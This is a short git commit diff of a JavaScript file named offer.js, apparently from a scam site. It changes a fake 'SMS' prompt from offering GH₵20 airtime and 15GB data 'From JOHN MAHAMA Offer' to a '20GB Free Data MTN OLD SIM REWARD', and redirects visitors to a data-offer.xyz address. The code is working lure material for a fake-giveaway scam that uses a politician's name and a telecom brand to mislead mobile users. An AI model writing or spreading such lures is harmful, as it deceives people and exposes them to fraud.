76cfb78fc776cf7272e3bd5f533cff1a07aa7274
decullian <decullianresort@gmail.com>
2024-08-28 04:54:56 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data MTN OLD SIM REWARD, Kindly Press OK to ACTIVATE ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://sim-rewards.data-offer.xyz/15GB';
 }
